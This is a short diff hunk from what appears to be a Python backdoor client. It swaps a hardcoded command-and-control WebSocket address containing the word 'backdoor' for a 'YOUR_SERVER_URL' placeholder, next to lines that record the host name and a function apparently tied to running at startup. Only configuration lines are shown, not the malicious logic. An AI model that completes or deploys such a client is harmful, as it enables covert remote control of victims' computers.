@@ -11,7 +11,7 @@ import socket
 
 current_exe = sys.executable
 
-server_url = "wss://backdoor-freezeee.onrender.com"
+server_url = "YOUR_SERVER_URL"
 CLIENT_NAME = socket.gethostname()
 
 def will_startup_execute(filename):
